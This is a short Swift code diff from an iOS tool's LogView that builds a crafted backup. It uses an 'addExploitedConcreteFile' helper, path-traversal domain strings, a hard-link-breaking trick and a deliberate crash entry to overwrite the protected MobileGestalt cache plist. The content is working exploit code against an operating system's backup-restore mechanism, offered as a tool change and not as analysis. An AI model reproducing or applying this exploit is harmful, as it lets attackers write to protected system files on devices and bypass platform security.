@@ -68,10 +68,13 @@ struct LogView: View {
             var backupFiles: [BackupFile] = [
                 Directory(path: "", domain: "RootDomain"),
                 Directory(path: "Library", domain: "RootDomain"),
-                Directory(path: "Library/Preferences", domain: "RootDomain")
+                Directory(path: "Library/Preferences", domain: "RootDomain"),
+                ConcreteFile(path: "Library/Preferences/temp", domain: "RootDomain", contents: mobileGestaltData, owner: 501, group: 501),
             ]
-            addExploitedConcreteFile(list: &backupFiles, path: "/var/containers/Shared/SystemGroup/systemgroup.com.apple.mobilegestaltcache/Library/Caches/com.apple.MobileGestalt.plist", contents: mobileGestaltData, owner: 501, group: 501)
-            backupFiles.append(ConcreteFile(path: "", domain: "SysContainerDomain-../../../../../../../../crash_on_purpose", contents: Data(), owner: 501, group: 501))
+            addExploitedConcreteFile(list: &backupFiles, path: "/var/containers/Shared/SystemGroup/systemgroup.com.apple.mobilegestaltcache/Library/Caches/com.apple.MobileGestalt.plist", contents: Data(), owner: 501, group: 501)
+            // Break the hard link
+            backupFiles.append(ConcreteFile(path: "", domain: "SysContainerDomain-../../../../../../../../var/.backup.i/var/root/Library/Preferences/temp", contents: Data(), owner: 501, group: 501))
+            backupFiles.append(ConcreteFile(path: "", domain: "SysContainerDomain-../../../../../../../../crash_on_purpose", contents: Data()))
             let mbdb = Backup(files: backupFiles)
             try mbdb.writeTo(directory: folder)
             
